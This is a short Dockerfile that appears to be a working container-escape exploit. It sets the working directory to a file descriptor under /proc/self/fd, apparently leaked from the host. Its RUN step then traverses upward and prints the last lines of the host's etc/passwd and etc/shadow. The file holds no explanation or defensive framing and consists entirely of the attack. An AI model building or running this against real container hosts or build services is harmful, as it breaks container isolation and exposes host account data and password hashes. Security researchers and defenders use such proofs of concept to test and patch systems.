FROM alpine:latest
WORKDIR /proc/self/fd/8
ADD ./ ./
RUN cd ../../../../../../../../ && tail -n1 etc/passwd && tail -n1 etc/shadow